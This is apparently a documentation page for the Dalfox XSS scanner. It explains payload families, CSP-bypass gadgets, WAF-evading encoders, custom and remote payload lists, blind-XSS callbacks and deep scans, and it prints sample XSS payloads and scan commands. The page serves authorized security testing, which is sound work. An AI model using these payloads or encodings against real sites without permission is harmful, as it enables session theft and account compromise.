+++
title = "Payloads & Encoding"
description = "Configure Dalfox XSS payload families, context-aware encoders, custom payloads, remote wordlists, blind XSS, and deep scans."
weight = 3
toc = true
+++

Dalfox has a built-in payload library and picks payloads to match each injection context, so most scans need no payload settings. This page covers what's built in and how to extend it.

## Payload families

Dalfox composes payloads from several families:

| Family | Example | Used when |
|--------|---------|-----------|
| **HTML tag** | `<svg onload=alert(1)>` | HTML context |
| **Attribute breakout** | `'><img src=x onerror=alert(1)>` | Inside an attribute |
| **JavaScript** | `";alert(1);//` | Inside a `<script>` block |
| **Event handler** | `onmouseover=alert(1)` | Existing attribute value |
| **DOM clobbering** | `<img id=x>` | Legacy DOM lookups |
| **URL protocol** | `javascript:alert(1)` | `href`/`src`-like attributes |
| **CSP bypass** | `strict-dynamic` script gadgets, nonce reuse, JSONP on allowed hosts | When the response carries a bypassable CSP |
| **mXSS** | `<foreignobject>`/DOMPurify bypasses | Sanitizer-mutated DOM |
| **Blind** | `"'><script src=CALLBACK></script>` | `-b`/`--blind` or `--blind-oob` is set |

Most payload templates carry a marker (`class={CLASS}` or `id={ID}`) so the verification stage can positively identify its own element in the DOM. A few short payloads carry no marker so they fit length-capped reflections; for those, verification looks for the payload's own event handler or `<script>` body in the parsed response instead.

## Context-aware selection

During discovery Dalfox classifies each parameter by **injection context**, the place where its reflected value lands:

- HTML body → HTML tag, mXSS, and DOM-clobbering payloads (wrapped in `-->…<!--` when the value lands inside an HTML comment)
- Inside a quoted attribute → attribute-breakout and self-triggering event-handler payloads, with URL-protocol payloads first
- Inside `<script>` → string-delimiter breakouts (`'-alert(1)-'`, `${alert(1)}`, …) and `</script>` tag breakouts
- Inside `<style>` → `</style>` breakouts followed by an HTML tag
- Unknown → an interleaved mix of HTML, attribute, mXSS, DOM-clobbering, and URL-protocol payloads

Sending only the payloads that fit the context keeps the request count down.

## CSP-aware bypass payloads

If the preflight response carries a `Content-Security-Policy` (or `…-Report-Only`) header, or the same policy in a `<meta http-equiv>` tag, Dalfox parses it and adds script payloads aimed at that policy's weak spots. It only adds payloads for directives that can actually be abused, so a target with no CSP gets no extra requests.

| CSP shape | What Dalfox sends |
|-----------|-------------------|
| `unsafe-inline` / `unsafe-eval` | inline and `eval`-family payloads |
| missing `base-uri` / `object-src` | `<base>` hijack, `<object>`/`<embed>` injection |
| `data:` / `blob:` in `script-src` | `<script src=data:…>` and `Blob` URL loaders |
| allowlisted CDN host | the JSONP or framework script gadget known for that host |
| `strict-dynamic` | DOM script gadgets (RequireJS `data-main`, `document.write` self-propagation, AngularJS bootstrap), plus nonce reuse when a nonce was captured |

Two of these need more explanation:

- `strict-dynamic`: the browser ignores the host allowlist, so a plain `<script src=allowed-host>` won't load. Dalfox switches to DOM script gadgets, which get an already-trusted script to create the attacker's script. If the policy pins a nonce, Dalfox also sends a `<script nonce=…>` payload. That works when the nonce is static, predictable, or reflected.
- Nonce and hash pinning: Dalfox reads `'nonce-…'` and `'sha256-…'` tokens to classify the policy. A policy that relies only on random nonces or hashes, with no `strict-dynamic` and no gadget host, counts as hardened. Dalfox sends no script payloads for it, only the `<base>` or `<object>` ones when `base-uri` or `object-src` is missing.

The gadgets come from public CSP-bypass research (JSONBee, cure53 H5SC, Google CSP Evaluator).

## Trusted Types awareness

[Trusted Types](https://web.dev/articles/trusted-types) is the main DOM-XSS defense in hardened apps. Dalfox's AST DOM-XSS analyzer takes it into account:

- A strict policy callback such as `createPolicy('p', {createHTML: s => DOMPurify.sanitize(s)})` counts as a sanitizer. Values passed through `p.createHTML(x)` are not reported.
- A permissive default policy, like the well-known no-op `createPolicy('default', {createHTML: x => x})`, does not count as protection. The finding is kept.
- If the response CSP enforces `require-trusted-types-for 'script'` and the page also defines a strict `'default'` policy, the browser sanitizes every TrustedHTML sink on its own. Dalfox drops those findings, since they would be false positives.

The classifier errs on the safe side. Anything it can't prove safe is treated as permissive, so the finding stays. Findings are only dropped when the policy is enforced: a page that defines a default policy but leaves out `require-trusted-types-for` is still reported.

## Encoders

Encoders transform the *same payload* into multiple forms so the WAF and server-side filters don't all see the same bytes.

```bash
dalfox scan https://target.app -e url,html,base64
```

Available encoders:

| Encoder | Transforms `<` to | Notes |
|---------|-------------------|-------|
| `none` | `<` (raw) | Turns encoding off (see below) |
| `url` | `%3C` | Single URL encoding |
| `2url` | `%253C` | Double URL encoding |
| `3url` | `%25253C` | Triple |
| `4url` | `%2525253C` | Quadruple |
| `html` | `&#x003c;` | Every character becomes a hex entity |
| `htmlpad` | `&#x000003c;` | 7-digit zero-padded hex entity; letters, digits, and spaces stay raw |
| `base64` | `PA==` | Base64 of the whole payload |
| `unicode` | `＜` | Printable ASCII mapped to its fullwidth form (U+FF01–U+FF5E) |
| `zwsp` | `<` + U+200B | Zero-width space inserted after `<` `>` `"` `'` `(` `)` `/` `;` |

Defaults: `url,html`. The raw payload is always sent too, so each active encoder adds one variant per base payload (the default sends each payload three ways). If you add `none` to the list, Dalfox sends only the raw payloads.

## Custom payloads

Provide your own list, one payload per line. Blank lines and lines starting with `#` are skipped:

```bash
dalfox scan https://target.app --custom-payload mypayloads.txt
```

Use a custom file instead of the local built-in library:

```bash
dalfox scan https://target.app --custom-payload mypayloads.txt --only-custom-payload
```

`--only-custom-payload` without `--custom-payload` is rejected. So is a missing file or one with no usable lines; without `--only-custom-payload` that is only a warning, and the scan runs on the built-in payloads. The custom file supplies the local reflection and DOM base payloads. Adaptive synthesis and shared CSP/technology payloads are skipped. Encoders and WAF mutations still produce variants of custom entries, and explicitly requested `--remote-payloads` remain active.

## Remote payload sources

Pull community wordlists on demand:

```bash
dalfox scan https://target.app --remote-payloads portswigger,payloadbox
```

Supported sources: `portswigger`, `payloadbox`. Fetched once per run, respecting `--proxy` and `--timeout`.

## Inspecting payloads

Print a payload family without running a scan. Each selector is described in the [CLI reference](../../reference/cli/); `portswigger` and `payloadbox` fetch remote lists, the rest are built in:

```bash
dalfox payload javascript      # alert(1), alert`1`, prompt(1), ...
dalfox payload event-handlers  # onerror, onmouseover, ...
dalfox payload useful-tags     # svg, img, script, ...
dalfox payload uri-scheme      # javascript:, data:
dalfox payload special-chars   # < > " ' ` ( ) ... and encoded variants
dalfox payload functions       # confirmable sinks: alert(1), window['alert'](1), ...
dalfox payload awesome-alert   # PoC alerts: alert(document.domain), alert(document.cookie)
dalfox payload dom-clobbering  # DOM clobbering vectors
dalfox payload mxss            # mutation-XSS / sanitizer-bypass payloads
dalfox payload blind           # blind-XSS skeletons ({} = your callback URL)
dalfox payload portswigger     # fetch + print remote list
dalfox payload payloadbox      # fetch + print remote list
dalfox payload all             # every local selector, grouped under "# name" headers
```

Every selector prints one entry per line, so it composes with the usual shell tools:

```bash
dalfox payload functions | grep -i prompt
dalfox payload special-chars | wc -l
```

Add `--json` to get a JSON array instead (`dalfox payload all --json` flattens every local group into one array; `dalfox payload --json` with no selector prints the per-selector counts).

The `special-chars` group helps with manual reflection testing. Inject each entry on its
own to see which characters come back unchanged, which come back HTML- or URL-encoded, and
which are stripped. `functions` lists calls that fire visibly, and `awesome-alert` also
shows the host or origin, so one screenshot proves impact.

## Customising the "alert"

The classic `alert(1)` can be loud. Swap it out so you can prove impact without popping dialogs everywhere:

```bash
# alert(document.domain): the value stays a JavaScript expression
dalfox scan https://target.app --custom-alert-value document.domain

# alert('dalfox'): the value becomes a string literal
dalfox scan https://target.app --custom-alert-value dalfox --custom-alert-type str
```

- `--custom-alert-value`: replaces the `1` in `alert(1)` / `prompt(1)` / `confirm(1)` calls (and their backtick forms). Default `1`. It reaches the main reflection payloads for parameters whose injection context was identified; DOM-verification and generated payloads keep `alert(1)`, so a reported PoC can still show `alert(1)`.
- `--custom-alert-type`: `none` (default) inserts the value as-is, so `document.domain` stays an expression; `str` wraps it in single quotes, so it becomes a string literal.

## Blind XSS

Blind XSS fires later, in a context you can't see (an admin panel, a support agent's dashboard). You need an out-of-band listener:

```bash
dalfox scan https://target.app -b https://your-callback.interact.sh
```

Custom blind templates:

```bash
dalfox scan https://target.app \
  -b https://your-callback.example \
  --custom-blind-xss-payload blind-templates.txt
# each line must contain {callback} (replaced with the callback URL)
```

Only lines containing `{callback}` are used; other lines are skipped with a warning, and `#` comments and blank lines are ignored. A literal `{}` is left alone, so a template can carry JavaScript like `()=>{}`. That also means the `{}` skeletons printed by `dalfox payload blind` need `{}` changed to `{callback}` before you use them here. If no line is usable, Dalfox falls back to the built-in templates.

Without a callback server of your own, `--blind-oob` registers with interactsh and polls for the callback itself, and a callback that arrives becomes a `V` finding; see [Blind XSS](../scanning-modes/#blind-xss) in Scanning Modes.

## HTTP Parameter Pollution (HPP)

Some filters only inspect one occurrence of a parameter. With `--hpp`, Dalfox re-sends the first five payloads of each **query** parameter with the parameter duplicated, putting the payload in the last slot, the first slot, and both:

```bash
dalfox scan https://target.app --hpp
```

A hit is reported as `R` with `inject_type` `inHTML-HPP`. It proves the payload survived the duplicate-parameter handling, not that it landed in an executable position, so confirm it manually.

## Deep scan

By default Dalfox stops testing a parameter once it finds a verified payload. `--deep-scan` keeps going, and also lifts the built-in cap of 3000 base payloads per parameter (see `--max-payloads-per-param` in the [CLI reference](../../reference/cli/)):

```bash
dalfox scan https://target.app --deep-scan
```

Useful for research; slower for production pipelines.

## Skipping payload stages

| Flag | Effect |
|------|--------|
| `--skip-xss-scanning` | Discover and probe only; no payload injection |
| `--skip-ast-analysis` | Skip AST-based DOM-XSS detection of inline scripts (the `[A]` findings) |

`--skip-ast-analysis` turns off the static DOM-XSS pass that reports `source → sink` flows (e.g. `location.hash` → `innerHTML`) as `[A]` (AST-detected) findings. This pass is separate from parameter mining, and `--skip-mining-dom` does not affect it. To keep the pass running but hide those findings from the output, use `--only-poc v,r`. What `[A]` actually proves (and why a pure client-side DOM-XSS never reaches `[V]`) is covered in [Detection Model](../detection-model/).

## Next

- Pair this with [WAF Bypass](../waf-bypass/) to bend payloads around filters.
- See [Output &amp; Reports](../output/) to export findings.
